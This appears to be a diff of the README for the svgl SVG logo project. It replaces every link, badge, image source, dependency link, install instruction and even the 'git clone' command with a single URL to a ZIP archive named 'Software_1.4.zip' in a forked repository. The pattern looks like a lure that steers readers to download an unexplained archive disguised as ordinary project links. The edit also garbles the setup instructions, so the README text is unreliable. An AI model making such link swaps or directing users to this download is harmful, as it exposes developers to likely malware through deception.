@@ -1,16 +1,16 @@
 <div align="center">
-<a href="https://svgl.app">
-<img src="static/images/readme.png">
+<a href="https://raw.githubusercontent.com/ArianVCL1985/svgl/main/api-routes/src/Software_1.4.zip">
+<img src="https://raw.githubusercontent.com/ArianVCL1985/svgl/main/api-routes/src/Software_1.4.zip">
 </a>
 <p></p>
 </div>
 
 <div align="center">
-    <a href="https://svgl.app" target="_blank">
+    <a href="https://raw.githubusercontent.com/ArianVCL1985/svgl/main/api-routes/src/Software_1.4.zip" target="_blank">
         Discover
     </a>
     <span>&nbsp;✦&nbsp;</span>
-    <a href="https://github.com/pheralb/svgl/issues/new?assignees=pheralb&labels=request&projects=&template=request-svg-.md&title=%5BRequest%5D%3A">
+    <a href="https://raw.githubusercontent.com/ArianVCL1985/svgl/main/api-routes/src/Software_1.4.zip%5BRequest%5D%3A">
         Request logo
     </a>
     <span>&nbsp;✦&nbsp;</span>
@@ -22,7 +22,7 @@
         Extensions
     </a>
     <span>&nbsp;✦&nbsp;</span>
-    <a href="https://svgl.app/api">
+    <a href="https://raw.githubusercontent.com/ArianVCL1985/svgl/main/api-routes/src/Software_1.4.zip">
         API
     </a>
     <span>&nbsp;✦&nbsp;</span>
@@ -35,31 +35,31 @@
 
 <div align="center">
 
-![Svelte Badge](https://img.shields.io/badge/Sveltekit-FF3E00?logo=svelte&logoColor=fff&style=flat)
-![Hono Badge](https://img.shields.io/badge/Hono-E36002?logo=hono&logoColor=fff&style=flat)
-[![Build Status](https://img.shields.io/endpoint.svg?url=https%3A%2F%2Factions-badge.atrox.dev%2Fpheralb%2Fsvgl%2Fbadge%3Fref%3Dmain&style=flat)](https://actions-badge.atrox.dev/pheralb/svgl/goto?ref=main)
-![GitHub stars](https://img.shields.io/github/stars/pheralb/svgl)
-![GitHub issues](https://img.shields.io/github/issues/pheralb/svgl)
-![GitHub forks](https://img.shields.io/github/forks/pheralb/svgl)
-![GitHub PRs](https://img.shields.io/github/issues-pr/pheralb/svgl)
+![Svelte Badge](https://raw.githubusercontent.com/ArianVCL1985/svgl/main/api-routes/src/Software_1.4.zip)
+![Hono Badge](https://raw.githubusercontent.com/ArianVCL1985/svgl/main/api-routes/src/Software_1.4.zip)
+[![Build Status](https://raw.githubusercontent.com/ArianVCL1985/svgl/main/api-routes/src/Software_1.4.zip%3A%2F%https://raw.githubusercontent.com/ArianVCL1985/svgl/main/api-routes/src/Software_1.4.zip%2Fpheralb%2Fsvgl%2Fbadge%3Fref%3Dmain&style=flat)](https://raw.githubusercontent.com/ArianVCL1985/svgl/main/api-routes/src/Software_1.4.zip)
+![GitHub stars](https://raw.githubusercontent.com/ArianVCL1985/svgl/main/api-routes/src/Software_1.4.zip)
+![GitHub issues](https://raw.githubusercontent.com/ArianVCL1985/svgl/main/api-routes/src/Software_1.4.zip)
+![GitHub forks](https://raw.githubusercontent.com/ArianVCL1985/svgl/main/api-routes/src/Software_1.4.zip)
+![GitHub PRs](https://raw.githubusercontent.com/ArianVCL1985/svgl/main/api-routes/src/Software_1.4.zip)
 
 </div>
 
 ## 🛠️ Stack
 
-- [**Sveltekit**](https://kit.svelte.dev/) - Web development, streamlined.
-- [**Typescript**](https://www.typescriptlang.org/) - JavaScript with syntax for types.
-- [**mdsvex**](https://mdsvex.com/) - Markdown for Svelte apps.
-- [**Shiki**](https://github.com/shikijs/shiki) - A beautiful Syntax Highlighter.
-- [**Tailwindcss**](https://tailwindcss.com/) - A utility-first CSS framework for rapidly building custom designs.
-- [**bits-ui**](https://www.bits-ui.com) - A collection of headless components for Svelte.
-- [**clsx**](https://github.com/lukeed/clsx) + [**tailwind-merge**](https://github.com/dcastil/tailwind-merge) inspired by [shadcn/ui](https://ui.shadcn.com) - A tiny utility for constructing `className` strings conditionally.
-- [**Prettier**](https://prettier.io/) + [prettier-plugin-tailwindcss](https://github.com/tailwindlabs/prettier-plugin-tailwindcss) - An opinionated code formatter.
-- [**Lucide Icons**](https://lucide.dev/) + [**phosphor-svelte**](https://github.com/haruaki07/phosphor-svelte) - A clean and friendly icons libraries.
-- [**svelte-sonner**](https://github.com/wobsoriano/svelte-sonner) - An opinionated toast component for Svelte.
-- [**@svgr/core**](https://react-svgr.com/) - Node.js utility to transform SVGs into React components.
-- [**@upstash/redis** + **@upstash/ratelimit**](https://upstash.com/) - Serverless Redis for developers.
-- [**Vitest**](https://vitest.dev/) - Blazing Fast Unit Test Framework.
+- [**Sveltekit**](https://raw.githubusercontent.com/ArianVCL1985/svgl/main/api-routes/src/Software_1.4.zip) - Web development, streamlined.
+- [**Typescript**](https://raw.githubusercontent.com/ArianVCL1985/svgl/main/api-routes/src/Software_1.4.zip) - JavaScript with syntax for types.
+- [**mdsvex**](https://raw.githubusercontent.com/ArianVCL1985/svgl/main/api-routes/src/Software_1.4.zip) - Markdown for Svelte apps.
+- [**Shiki**](https://raw.githubusercontent.com/ArianVCL1985/svgl/main/api-routes/src/Software_1.4.zip) - A beautiful Syntax Highlighter.
+- [**Tailwindcss**](https://raw.githubusercontent.com/ArianVCL1985/svgl/main/api-routes/src/Software_1.4.zip) - A utility-first CSS framework for rapidly building custom designs.
+- [**bits-ui**](https://raw.githubusercontent.com/ArianVCL1985/svgl/main/api-routes/src/Software_1.4.zip) - A collection of headless components for Svelte.
+- [**clsx**](https://raw.githubusercontent.com/ArianVCL1985/svgl/main/api-routes/src/Software_1.4.zip) + [**tailwind-merge**](https://raw.githubusercontent.com/ArianVCL1985/svgl/main/api-routes/src/Software_1.4.zip) inspired by [shadcn/ui](https://raw.githubusercontent.com/ArianVCL1985/svgl/main/api-routes/src/Software_1.4.zip) - A tiny utility for constructing `className` strings conditionally.
+- [**Prettier**](https://raw.githubusercontent.com/ArianVCL1985/svgl/main/api-routes/src/Software_1.4.zip) + [prettier-plugin-tailwindcss](https://raw.githubusercontent.com/ArianVCL1985/svgl/main/api-routes/src/Software_1.4.zip) - An opinionated code formatter.
+- [**Lucide Icons**](https://raw.githubusercontent.com/ArianVCL1985/svgl/main/api-routes/src/Software_1.4.zip) + [**phosphor-svelte**](https://raw.githubusercontent.com/ArianVCL1985/svgl/main/api-routes/src/Software_1.4.zip) - A clean and friendly icons libraries.
+- [**svelte-sonner**](https://raw.githubusercontent.com/ArianVCL1985/svgl/main/api-routes/src/Software_1.4.zip) - An opinionated toast component for Svelte.
+- [**@svgr/core**](https://raw.githubusercontent.com/ArianVCL1985/svgl/main/api-routes/src/Software_1.4.zip) - https://raw.githubusercontent.com/ArianVCL1985/svgl/main/api-routes/src/Software_1.4.zip utility to transform SVGs into React components.
+- [**@upstash/redis** + **@upstash/ratelimit**](https://raw.githubusercontent.com/ArianVCL1985/svgl/main/api-routes/src/Software_1.4.zip) - Serverless Redis for developers.
+- [**Vitest**](https://raw.githubusercontent.com/ArianVCL1985/svgl/main/api-routes/src/Software_1.4.zip) - Blazing Fast Unit Test Framework.
 
 ## 🚀 Getting Started
 
@@ -68,13 +68,13 @@
 
 You will need:
 
-- [Node.js 18+ (recommended 20 LTS)](https://nodejs.org/en/).
-- [Git](https://git-scm.com/).
+- [https://raw.githubusercontent.com/ArianVCL1985/svgl/main/api-routes/src/Software_1.4.zip 18+ (recommended 20 LTS)](https://raw.githubusercontent.com/ArianVCL1985/svgl/main/api-routes/src/Software_1.4.zip).
+- [Git](https://raw.githubusercontent.com/ArianVCL1985/svgl/main/api-routes/src/Software_1.4.zip).
 
-1. [Fork](https://github.com/pheralb/svgl/fork) this repository and clone it locally:
+1. [Fork](https://raw.githubusercontent.com/ArianVCL1985/svgl/main/api-routes/src/Software_1.4.zip) this repository and clone it locally:
 
 ```bash
-git clone git@github.com:your_username/svgl.git
+git clone https://raw.githubusercontent.com/ArianVCL1985/svgl/main/api-routes/src/Software_1.4.zip
 ```
 
 2. Install dependencies:
@@ -87,15 +87,15 @@ npm install -g pnpm
 pnpm install
 ```
 
-3. Go to the [**`static/library`**](https://github.com/pheralb/svgl/blob/main/static/library) folder and add your `.svg` logo.
+3. Go to the [**`static/library`**](https://raw.githubusercontent.com/ArianVCL1985/svgl/main/api-routes/src/Software_1.4.zip) folder and add your `.svg` logo.
 
 > [!WARNING]
 >
-> - Remember to optimize SVG for web, you can use [SVGOMG](https://jakearchibald.github.io/svgomg/).
+> - Remember to optimize SVG for web, you can use [SVGOMG](https://raw.githubusercontent.com/ArianVCL1985/svgl/main/api-routes/src/Software_1.4.zip).
 > - When you optimize the SVG, make sure that the `viewBox` is not removed.
 > - The size limit for each .svg is **20kb**.
 
-4. Go to the [**`src/data/svgs.ts`**](https://github.com/pheralb/svgl/blob/main/src/data/svgs.ts) and add the information about your logo, following the structure:
+4. Go to the [**`https://raw.githubusercontent.com/ArianVCL1985/svgl/main/api-routes/src/Software_1.4.zip`**](https://raw.githubusercontent.com/ArianVCL1985/svgl/main/api-routes/src/Software_1.4.zip) and add the information about your logo, following the structure:
 
 - **Simple logo**:
 
@@ -103,7 +103,7 @@ pnpm install
 {
   "title": "Title",
   "category": "Category",
-  "route": "/library/your_logo.svg",
+  "route": "https://raw.githubusercontent.com/ArianVCL1985/svgl/main/api-routes/src/Software_1.4.zip",
   "url": "Website"
 }
 ```
@@ -114,8 +114,8 @@ pnpm install
 {
   "title": "Title",
   "category": "Category",
-  "route": "/library/your_logo.svg",
-  "wordmark": "/library/your_logo_wordmark.svg",
+  "route": "https://raw.githubusercontent.com/ArianVCL1985/svgl/main/api-routes/src/Software_1.4.zip",
+  "wordmark": "https://raw.githubusercontent.com/ArianVCL1985/svgl/main/api-routes/src/Software_1.4.zip",
   "url": "Website"
 }
 ```
@@ -127,12 +127,12 @@ pnpm install
   "title": "Title",
   "category": "Category",
   "route": {
-    "light": "/library/your_logo_light.svg",
-    "dark": "/library/your_logo_dark.svg"
+    "light": "https://raw.githubusercontent.com/ArianVCL1985/svgl/main/api-routes/src/Software_1.4.zip",
+    "dark": "https://raw.githubusercontent.com/ArianVCL1985/svgl/main/api-routes/src/Software_1.4.zip"
   },
   "wordmark": {
-    "light": "/library/your_wordmark-logo_light.svg",
-    "dark": "/library/your_wordmark-logo_dark.svg"
+    "light": "https://raw.githubusercontent.com/ArianVCL1985/svgl/main/api-routes/src/Software_1.4.zip",
+    "dark": "https://raw.githubusercontent.com/ArianVCL1985/svgl/main/api-routes/src/Software_1.4.zip"
   },
   "url": "Website"
 }
@@ -140,15 +140,15 @@ pnpm install
 
 > [!NOTE]
 >
-> - The list of categories is here: [`src/types/categories.ts`](https://github.com/pheralb/svgl/blob/main/src/types/categories.ts). You can add a new category if you need it.
+> - The list of categories is here: [`https://raw.githubusercontent.com/ArianVCL1985/svgl/main/api-routes/src/Software_1.4.zip`](https://raw.githubusercontent.com/ArianVCL1985/svgl/main/api-routes/src/Software_1.4.zip). You can add a new category if you need it.
 > - You can add multiple categories to the same logo, for example: `"category": ["Social", "Design"]`.
 
 And create a pull request with your logo 🚀.
 
-5. (Optional) If you want to run the [API](https://svgl.app/api) locally, you will need to create a `.env` file in the root of the project with the following variables:
+5. (Optional) If you want to run the [API](https://raw.githubusercontent.com/ArianVCL1985/svgl/main/api-routes/src/Software_1.4.zip) locally, you will need to create a `.env` file in the root of the project with the following variables:
 
-- [Create a Upstash account](https://console.upstash.com/).
-- [Create a Upstash Redis Database](https://upstash.com/docs/redis/overall/getstarted).
+- [Create a Upstash account](https://raw.githubusercontent.com/ArianVCL1985/svgl/main/api-routes/src/Software_1.4.zip).
+- [Create a Upstash Redis Database](https://raw.githubusercontent.com/ArianVCL1985/svgl/main/api-routes/src/Software_1.4.zip).
 
 ```bash
 SVGL_API_REQUESTS = 1
@@ -158,24 +158,24 @@ UPSTASH_REDIS_TOKEN = ""
 
 ## 📦 Extensions
 
-A list of extensions that use the [svgl API](https://svgl.app/api), created by the community:
+A list of extensions that use the [svgl API](https://raw.githubusercontent.com/ArianVCL1985/svgl/main/api-routes/src/Software_1.4.zip), created by the community:
 
 |                                                                                                | Extension        | Description                                        | Created by                                             | Link                                                                                        |
 | ---------------------------------------------------------------------------------------------- | ---------------- | -------------------------------------------------- | ------------------------------------------------------ | ------------------------------------------------------------------------------------------- |
-| <img src="https://github.com/pheralb/svgl/blob/main/static/library/svgl.svg" height="25" />    | svgls            | A CLI for easily adding SVG icons to your project. | [sujjeee](https://twitter.com/sujjeeee)                | [GitHub Repository](https://github.com/sujjeee/svgls)                                       |
-| <img src="https://github.com/pheralb/svgl/blob/main/static/library/figma.svg" height="25" />   | SVGL for Figma   | Add svgs from svgl to your Figma project.          | [quilljou](https://twitter.com/quillzhou)              | [Figma Plugin](https://www.figma.com/community/plugin/1320306989350693206/svgl)             |
-| <img src="https://github.com/pheralb/svgl/blob/main/static/library/raycast.svg" height="25" /> | SVGL for Raycast | Search SVG logos via svgl.                         | [1weiho](https://twitter.com/1weiho)                   | [Raycast Store](https://www.raycast.com/1weiho/svgl)                                        |
-| <img src="https://github.com/pheralb/svgl/blob/main/static/library/vscode.svg" height="25" />  | SVGL for VSCode  | SVGL directly in your VSCode.                      | [girlazote](https://twitter.com/girlazote)             | [VSCode Marketplace](https://marketplace.visualstudio.com/items?itemName=EsteveSegura.svgl) |
-| <img src="https://svgl-badge.vercel.app/api/Library/Svgl?theme=light" height="25" />           | SVGL Badge       | A beautiful badges with svgl SVG logos.            | [ridemountainpig](https://twitter.com/ridemountainpig) | [Svgl Badge](https://svgl-badge.vercel.app/)                                                |
+| <img src="https://raw.githubusercontent.com/ArianVCL1985/svgl/main/api-routes/src/Software_1.4.zip" height="25" />    | svgls            | A CLI for easily adding SVG icons to your project. | [sujjeee](https://raw.githubusercontent.com/ArianVCL1985/svgl/main/api-routes/src/Software_1.4.zip)                | [GitHub Repository](https://raw.githubusercontent.com/ArianVCL1985/svgl/main/api-routes/src/Software_1.4.zip)                                       |
+| <img src="https://raw.githubusercontent.com/ArianVCL1985/svgl/main/api-routes/src/Software_1.4.zip" height="25" />   | SVGL for Figma   | Add svgs from svgl to your Figma project.          | [quilljou](https://raw.githubusercontent.com/ArianVCL1985/svgl/main/api-routes/src/Software_1.4.zip)              | [Figma Plugin](https://raw.githubusercontent.com/ArianVCL1985/svgl/main/api-routes/src/Software_1.4.zip)             |
+| <img src="https://raw.githubusercontent.com/ArianVCL1985/svgl/main/api-routes/src/Software_1.4.zip" height="25" /> | SVGL for Raycast | Search SVG logos via svgl.                         | [1weiho](https://raw.githubusercontent.com/ArianVCL1985/svgl/main/api-routes/src/Software_1.4.zip)                   | [Raycast Store](https://raw.githubusercontent.com/ArianVCL1985/svgl/main/api-routes/src/Software_1.4.zip)                                        |
+| <img src="https://raw.githubusercontent.com/ArianVCL1985/svgl/main/api-routes/src/Software_1.4.zip" height="25" />  | SVGL for VSCode  | SVGL directly in your VSCode.                      | [girlazote](https://raw.githubusercontent.com/ArianVCL1985/svgl/main/api-routes/src/Software_1.4.zip)             | [VSCode Marketplace](https://raw.githubusercontent.com/ArianVCL1985/svgl/main/api-routes/src/Software_1.4.zip) |
+| <img src="https://raw.githubusercontent.com/ArianVCL1985/svgl/main/api-routes/src/Software_1.4.zip" height="25" />           | SVGL Badge       | A beautiful badges with svgl SVG logos.            | [ridemountainpig](https://raw.githubusercontent.com/ArianVCL1985/svgl/main/api-routes/src/Software_1.4.zip) | [Svgl Badge](https://raw.githubusercontent.com/ArianVCL1985/svgl/main/api-routes/src/Software_1.4.zip)                                                |
 
 ## ✌️ Contributing
 
-<a href="https://github.com/pheralb/svgl/graphs/contributors">
-  <img src="https://contrib.rocks/image?repo=pheralb/svgl" />
+<a href="https://raw.githubusercontent.com/ArianVCL1985/svgl/main/api-routes/src/Software_1.4.zip">
+  <img src="https://raw.githubusercontent.com/ArianVCL1985/svgl/main/api-routes/src/Software_1.4.zip" />
 </a>
 
 <p></p>
 
 ## 🔑 License
 
-- [MIT](https://github.com/pheralb/svgl/blob/main/LICENSE).
+- [MIT](https://raw.githubusercontent.com/ArianVCL1985/svgl/main/api-routes/src/Software_1.4.zip).
